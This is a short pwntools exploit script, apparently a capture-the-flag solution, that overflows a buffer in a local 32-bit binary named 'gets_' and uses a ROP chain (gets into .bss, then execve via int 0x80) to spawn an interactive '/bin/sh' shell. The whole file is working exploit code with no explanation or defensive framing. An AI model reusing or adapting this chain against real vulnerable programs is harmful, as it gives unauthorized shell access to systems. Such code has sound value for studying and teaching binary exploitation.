#!/usr/bin/python 
from pwn import *

p = process("./gets_")
elf = ELF("./gets_")

pop_eax = 0x80b84d6
pop_ecx = 0x80dece1
pop_ebx = 0x80481c9
pop_rdx = 0x806f19a
int_0x80 = 0x806f7a0
gets_plt = 0x804f290
bss = 0x80eaf80

pay = 'A'*(0x18+0x4)
pay += p32(gets_plt) + p32(pop_eax) + p32(bss)
pay += p32(pop_eax) + p32(0xb)
pay += p32(pop_ebx) + p32(bss) + p32(pop_ecx) + p32(0) + p32(pop_rdx) + p32(0)
pay += p32(int_0x80)

p.sendline(pay)
p.sendline("/bin/sh\x00")

p.interactive()
